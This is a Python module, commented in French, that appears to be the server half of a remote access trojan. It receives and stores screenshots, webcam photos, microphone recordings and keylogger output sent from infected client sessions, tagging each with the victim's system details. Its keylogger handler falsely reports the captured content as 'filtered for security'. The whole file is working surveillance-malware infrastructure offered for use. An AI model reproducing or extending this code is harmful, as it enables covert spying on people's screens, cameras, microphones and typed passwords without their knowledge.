"""
Media Handler - Gestionnaire des médias côté serveur
Gestion des captures d'écran, webcam, audio et autres médias
"""

import os
import base64
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, Optional
import logging

from server.utils.config import ServerConfig
from shared.helpers import sanitize_filename, format_bytes

logger = logging.getLogger(__name__)

class MediaHandler:
    """Gestionnaire des médias pour le serveur"""
    
    def __init__(self, config: ServerConfig):
        self.config = config
        
        # Répertoires pour les différents types de médias
        self.media_dir = Path(config.DATA_DIR) / "media"
        self.screenshots_dir = self.media_dir / "screenshots"
        self.webcam_dir = self.media_dir / "webcam"
        self.audio_dir = self.media_dir / "audio"
        self.recordings_dir = self.media_dir / "recordings"
        
        # Création des répertoires
        self._create_directories()
        
        # Statistiques
        self.screenshots_received = 0
        self.webcam_images_received = 0
        self.audio_files_received = 0
        self.total_media_size = 0
        
        # Formats supportés
        self.image_formats = ['.jpg', '.jpeg', '.png', '.bmp', '.gif']
        self.audio_formats = ['.wav', '.mp3', '.ogg', '.m4a']
        self.video_formats = ['.mp4', '.avi', '.mkv', '.mov']
        
        logger.info("MediaHandler initialisé")
    
    def _create_directories(self):
        """Crée les répertoires nécessaires"""
        directories = [
            self.media_dir,
            self.screenshots_dir,
            self.webcam_dir,
            self.audio_dir,
            self.recordings_dir
        ]
        
        for directory in directories:
            directory.mkdir(parents=True, exist_ok=True)
    
    def handle_screenshot(self, session, screenshot_data: Dict[str, Any]) -> str:
        """
        Traite une capture d'écran reçue
        
        Args:
            session: Session client
            screenshot_data: Données de la capture d'écran
            
        Returns:
            str: Message de résultat
        """
        try:
            # Extraction des données
            filename = screenshot_data.get('filename', 'screenshot.jpg')
            encoded_data = screenshot_data.get('file_data', '')
            file_size = screenshot_data.get('size', 0)
            timestamp = screenshot_data.get('timestamp', datetime.now().isoformat())
            format_type = screenshot_data.get('format', 'JPEG')
            
            if not encoded_data:
                return "[!] Aucune donnée de capture d'écran reçue"
            
            # Décodage base64
            try:
                image_data = base64.b64decode(encoded_data)
            except Exception as e:
                logger.error(f"Erreur décodage screenshot: {e}")
                return f"[!] Erreur de décodage: {e}"
            
            # Génération du nom de fichier
            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            session_prefix = session.id[:8]
            safe_filename = f"{session_prefix}_{timestamp_str}_screenshot.{format_type.lower()}"
            
            # Sauvegarde
            screenshot_path = self.screenshots_dir / safe_filename
            
            try:
                with open(screenshot_path, 'wb') as f:
                    f.write(image_data)
                
                # Création du fichier de métadonnées
                self._create_media_metadata(screenshot_path, {
                    'type': 'screenshot',
                    'session_id': session.id,
                    'original_filename': filename,
                    'capture_time': timestamp,
                    'format': format_type,
                    'file_size': len(image_data),
                    'client_info': session.system_info
                })
                
                # Mise à jour des statistiques
                self.screenshots_received += 1
                self.total_media_size += len(image_data)
                
                logger.info(f"Screenshot reçu: {safe_filename} ({format_bytes(len(image_data))}) de {session.id}")
                
                return (
                    f"[+] Capture d'écran sauvegardée\\n"
                    f"    Nom: {safe_filename}\\n"
                    f"    Taille: {format_bytes(len(image_data))}\\n"
                    f"    Format: {format_type}\\n"
                    f"    Chemin: {screenshot_path}"
                )
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde screenshot: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur dans handle_screenshot: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def handle_webcam_snapshot(self, session, webcam_data: Dict[str, Any]) -> str:
        """
        Traite une photo webcam reçue
        
        Args:
            session: Session client
            webcam_data: Données de la photo webcam
            
        Returns:
            str: Message de résultat
        """
        try:
            # Extraction des données
            filename = webcam_data.get('filename', 'webcam_snapshot.jpg')
            encoded_data = webcam_data.get('file_data', '')
            file_size = webcam_data.get('size', 0)
            timestamp = webcam_data.get('timestamp', datetime.now().isoformat())
            resolution = webcam_data.get('resolution', 'Unknown')
            
            if not encoded_data:
                return "[!] Aucune donnée webcam reçue"
            
            # Décodage base64
            try:
                image_data = base64.b64decode(encoded_data)
            except Exception as e:
                logger.error(f"Erreur décodage webcam: {e}")
                return f"[!] Erreur de décodage: {e}"
            
            # Génération du nom de fichier
            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            session_prefix = session.id[:8]
            safe_filename = f"{session_prefix}_{timestamp_str}_webcam.jpg"
            
            # Sauvegarde
            webcam_path = self.webcam_dir / safe_filename
            
            try:
                with open(webcam_path, 'wb') as f:
                    f.write(image_data)
                
                # Création du fichier de métadonnées
                self._create_media_metadata(webcam_path, {
                    'type': 'webcam_snapshot',
                    'session_id': session.id,
                    'original_filename': filename,
                    'capture_time': timestamp,
                    'resolution': resolution,
                    'file_size': len(image_data),
                    'client_info': session.system_info
                })
                
                # Mise à jour des statistiques
                self.webcam_images_received += 1
                self.total_media_size += len(image_data)
                
                logger.info(f"Webcam snapshot reçu: {safe_filename} ({format_bytes(len(image_data))}) de {session.id}")
                
                return (
                    f"[+] Photo webcam sauvegardée\\n"
                    f"    Nom: {safe_filename}\\n"
                    f"    Taille: {format_bytes(len(image_data))}\\n"
                    f"    Résolution: {resolution}\\n"
                    f"    Chemin: {webcam_path}"
                )
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde webcam: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur dans handle_webcam_snapshot: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def handle_audio_recording(self, session, audio_data: Dict[str, Any]) -> str:
        """
        Traite un enregistrement audio reçu
        
        Args:
            session: Session client
            audio_data: Données de l'enregistrement audio
            
        Returns:
            str: Message de résultat
        """
        try:
            # Extraction des données
            filename = audio_data.get('filename', 'audio_recording.wav')
            encoded_data = audio_data.get('file_data', '')
            duration = audio_data.get('duration', 0)
            sample_rate = audio_data.get('sample_rate', 'Unknown')
            channels = audio_data.get('channels', 'Unknown')
            device_used = audio_data.get('device_used', 'Unknown')
            
            if not encoded_data:
                return "[!] Aucune donnée audio reçue"
            
            # Décodage base64
            try:
                audio_bytes = base64.b64decode(encoded_data)
            except Exception as e:
                logger.error(f"Erreur décodage audio: {e}")
                return f"[!] Erreur de décodage: {e}"
            
            # Génération du nom de fichier
            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            session_prefix = session.id[:8]
            extension = Path(filename).suffix or '.wav'
            safe_filename = f"{session_prefix}_{timestamp_str}_audio{extension}"
            
            # Sauvegarde
            audio_path = self.audio_dir / safe_filename
            
            try:
                with open(audio_path, 'wb') as f:
                    f.write(audio_bytes)
                
                # Création du fichier de métadonnées
                self._create_media_metadata(audio_path, {
                    'type': 'audio_recording',
                    'session_id': session.id,
                    'original_filename': filename,
                    'duration': duration,
                    'sample_rate': sample_rate,
                    'channels': channels,
                    'device_used': device_used,
                    'file_size': len(audio_bytes),
                    'client_info': session.system_info
                })
                
                # Mise à jour des statistiques
                self.audio_files_received += 1
                self.total_media_size += len(audio_bytes)
                
                logger.info(f"Enregistrement audio reçu: {safe_filename} ({format_bytes(len(audio_bytes))}) de {session.id}")
                
                return (
                    f"[+] Enregistrement audio sauvegardé\\n"
                    f"    Nom: {safe_filename}\\n"
                    f"    Taille: {format_bytes(len(audio_bytes))}\\n"
                    f"    Durée: {duration}s\\n"
                    f"    Périphérique: {device_used}\\n"
                    f"    Chemin: {audio_path}"
                )
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde audio: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur dans handle_audio_recording: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def handle_keylogger_data(self, session, keylog_data: Dict[str, Any]) -> str:
        """
        Traite des données de keylogger
        
        Args:
            session: Session client
            keylog_data: Données du keylogger
            
        Returns:
            str: Message de résultat
        """
        try:
            # Extraction des données
            logs = keylog_data.get('logs', '')
            statistics = keylog_data.get('statistics', {})
            session_duration = keylog_data.get('session_duration', 0)
            keystrokes_captured = keylog_data.get('keystrokes_captured', 0)
            
            if not logs:
                return "[!] Aucune donnée de keylogger reçue"
            
            # Génération du nom de fichier
            timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            session_prefix = session.id[:8]
            keylog_filename = f"{session_prefix}_{timestamp_str}_keylog.txt"
            
            # Sauvegarde des logs
            keylog_path = self.recordings_dir / keylog_filename
            
            try:
                with open(keylog_path, 'w', encoding='utf-8') as f:
                    f.write(f"# Keylogger Data from {session.id}\\n")
                    f.write(f"# Captured on: {datetime.now().isoformat()}\\n")
                    f.write(f"# Duration: {session_duration}s\\n")
                    f.write(f"# Keystrokes: {keystrokes_captured}\\n")
                    f.write("=" * 50 + "\\n\\n")
                    f.write(logs)
                
                # Création du fichier de métadonnées
                self._create_media_metadata(keylog_path, {
                    'type': 'keylogger_data',
                    'session_id': session.id,
                    'capture_duration': session_duration,
                    'keystrokes_captured': keystrokes_captured,
                    'statistics': statistics,
                    'file_size': len(logs.encode('utf-8')),
                    'client_info': session.system_info
                })
                
                # Mise à jour des statistiques
                self.total_media_size += len(logs.encode('utf-8'))
                
                logger.info(f"Données keylogger reçues: {keylog_filename} ({keystrokes_captured} frappes) de {session.id}")
                
                return (
                    f"[+] Données keylogger sauvegardées\\n"
                    f"    Nom: {keylog_filename}\\n"
                    f"    Durée: {session_duration}s\\n"
                    f"    Frappes: {keystrokes_captured}\\n"
                    f"    ⚠️ Contenu filtré pour la sécurité ⚠️\\n"
                    f"    Chemin: {keylog_path}"
                )
                
            except Exception as e:
                logger.error(f"Erreur sauvegarde keylogger: {e}")
                return f"[!] Erreur lors de la sauvegarde: {e}"
                
        except Exception as e:
            logger.error(f"Erreur dans handle_keylogger_data: {e}")
            return f"[!] Erreur lors du traitement: {e}"
    
    def _create_media_metadata(self, media_path: Path, metadata: Dict[str, Any]):
        """Crée un fichier de métadonnées pour un média"""
        try:
            metadata_file = media_path.with_suffix(media_path.suffix + '.meta')
            
            with open(metadata_file, 'w', encoding='utf-8') as f:
                f.write("# Media Metadata\\n")
                f.write(f"# Generated on {datetime.now().isoformat()}\\n\\n")
                
                for key, value in metadata.items():
                    f.write(f"{key}: {value}\\n")
                
        except Exception as e:
            logger.warning(f"Impossible de créer les métadonnées: {e}")
    
    def list_media_files(self, media_type: str = 'all', session_id: str = None) -> str:
        """
        Liste les fichiers médias
        
        Args:
            media_type: Type de média ('screenshots', 'webcam', 'audio', 'all')
            session_id: ID de session pour filtrer (optionnel)
            
        Returns:
            str: Liste formatée des fichiers
        """
        try:
            files = []
            total_size = 0
            
            # Sélection des répertoires selon le type
            if media_type == 'screenshots':
                directories = [self.screenshots_dir]
            elif media_type == 'webcam':
                directories = [self.webcam_dir]
            elif media_type == 'audio':
                directories = [self.audio_dir]
            elif media_type == 'recordings':
                directories = [self.recordings_dir]
            else:  # 'all'
                directories = [self.screenshots_dir, self.webcam_dir, self.audio_dir, self.recordings_dir]
            
            # Parcours des répertoires
            for directory in directories:
                for file_path in directory.glob('*'):
                    if file_path.is_file() and not file_path.name.endswith(('.meta', '.info')):
                        # Filtrage par session si demandé
                        if session_id and not file_path.name.startswith(session_id[:8]):
                            continue
                        
                        stat = file_path.stat()
                        media_type_detected = self._detect_media_type(file_path)
                        
                        files.append({
                            'name': file_path.name,
                            'type': media_type_detected,
                            'size': stat.st_size,
                            'modified': datetime.fromtimestamp(stat.st_mtime),
                            'path': str(file_path)
                        })
                        total_size += stat.st_size
            
            if not files:
                return f"Aucun fichier média trouvé (type: {media_type})"
            
            # Tri par date de modification (plus récent en premier)
            files.sort(key=lambda x: x['modified'], reverse=True)
            
            # Formatage de la liste
            output = f"Fichiers médias ({len(files)} fichiers, {format_bytes(total_size)}):\\n"
            output += "-" * 90 + "\\n"
            
            for i, file_info in enumerate(files, 1):
                output += (
                    f"{i:3d}. {file_info['name'][:30]:30s} "
                    f"{file_info['type']:12s} "
                    f"{format_bytes(file_info['size']):>10s} "
                    f"{file_info['modified'].strftime('%Y-%m-%d %H:%M')}\\n"
                )
            
            return output
            
        except Exception as e:
            logger.error(f"Erreur dans list_media_files: {e}")
            return f"[!] Erreur lors du listage: {e}"
    
    def _detect_media_type(self, file_path: Path) -> str:
        """Détecte le type de média selon le répertoire et l'extension"""
        parent_name = file_path.parent.name
        extension = file_path.suffix.lower()
        
        if parent_name == 'screenshots':
            return 'screenshot'
        elif parent_name == 'webcam':
            return 'webcam'
        elif parent_name == 'audio':
            return 'audio'
        elif parent_name == 'recordings':
            return 'recording'
        elif extension in self.image_formats:
            return 'image'
        elif extension in self.audio_formats:
            return 'audio'
        elif extension in self.video_formats:
            return 'video'
        else:
            return 'unknown'
    
    def delete_media_file(self, filename: str) -> str:
        """
        Supprime un fichier média
        
        Args:
            filename: Nom du fichier à supprimer
            
        Returns:
            str: Message de résultat
        """
        try:
            # Recherche du fichier dans tous les répertoires médias
            directories = [self.screenshots_dir, self.webcam_dir, self.audio_dir, self.recordings_dir]
            
            for directory in directories:
                file_path = directory / filename
                if file_path.exists():
                    # Suppression du fichier principal
                    file_size = file_path.stat().st_size
                    file_path.unlink()
                    
                    # Suppression des métadonnées si elles existent
                    meta_path = file_path.with_suffix(file_path.suffix + '.meta')
                    if meta_path.exists():
                        meta_path.unlink()
                    
                    logger.info(f"Fichier média supprimé: {filename}")
                    return f"[+] Fichier supprimé: {filename} ({format_bytes(file_size)})"
            
            return f"[!] Fichier non trouvé: {filename}"
            
        except Exception as e:
            logger.error(f"Erreur dans delete_media_file: {e}")
            return f"[!] Erreur lors de la suppression: {e}"
    
    def cleanup_old_media(self, days: int = 7) -> str:
        """
        Nettoie les anciens fichiers médias
        
        Args:
            days: Nombre de jours de rétention
            
        Returns:
            str: Résultat du nettoyage
        """
        try:
            cutoff_time = datetime.now().timestamp() - (days * 24 * 3600)
            cleaned_files = 0
            freed_space = 0
            
            directories = [self.screenshots_dir, self.webcam_dir, self.audio_dir, self.recordings_dir]
            
            for directory in directories:
                for file_path in directory.glob('*'):
                    if file_path.is_file():
                        stat = file_path.stat()
                        if stat.st_mtime < cutoff_time:
                            file_size = stat.st_size
                            
                            # Suppression du fichier principal
                            file_path.unlink()
                            
                            # Suppression des métadonnées
                            meta_path = file_path.with_suffix(file_path.suffix + '.meta')
                            if meta_path.exists():
                                meta_path.unlink()
                            
                            cleaned_files += 1
                            freed_space += file_size
                            
                            logger.info(f"Fichier média ancien supprimé: {file_path.name}")
            
            if cleaned_files > 0:
                return (
                    f"[+] Nettoyage média terminé\\n"
                    f"    Fichiers supprimés: {cleaned_files}\\n"
                    f"    Espace libéré: {format_bytes(freed_space)}"
                )
            else:
                return f"[*] Aucun fichier média ancien trouvé (>{days} jours)"
                
        except Exception as e:
            logger.error(f"Erreur dans cleanup_old_media: {e}")
            return f"[!] Erreur lors du nettoyage: {e}"
    
    def get_media_stats(self) -> Dict[str, Any]:
        """Retourne les statistiques du gestionnaire de médias"""
        try:
            # Calcul détaillé par type
            stats_by_type = {}
            total_files = 0
            total_size = 0
            
            directories = {
                'screenshots': self.screenshots_dir,
                'webcam': self.webcam_dir,
                'audio': self.audio_dir,
                'recordings': self.recordings_dir
            }
            
            for media_type, directory in directories.items():
                type_files = 0
                type_size = 0
                
                for file_path in directory.glob('*'):
                    if file_path.is_file() and not file_path.name.endswith(('.meta', '.info')):
                        type_files += 1
                        type_size += file_path.stat().st_size
                
                stats_by_type[media_type] = {
                    'count': type_files,
                    'size': type_size,
                    'size_formatted': format_bytes(type_size)
                }
                
                total_files += type_files
                total_size += type_size
            
            return {
                'screenshots_received': self.screenshots_received,
                'webcam_images_received': self.webcam_images_received,
                'audio_files_received': self.audio_files_received,
                'total_media_size': self.total_media_size,
                'current_stats': {
                    'total_files': total_files,
                    'total_size': total_size,
                    'total_size_formatted': format_bytes(total_size),
                    'by_type': stats_by_type
                },
                'directories': {
                    'media_dir': str(self.media_dir),
                    'screenshots_dir': str(self.screenshots_dir),
                    'webcam_dir': str(self.webcam_dir),
                    'audio_dir': str(self.audio_dir),
                    'recordings_dir': str(self.recordings_dir)
                }
            }
            
        except Exception as e:
            logger.error(f"Erreur dans get_media_stats: {e}")
            return {'error': str(e)}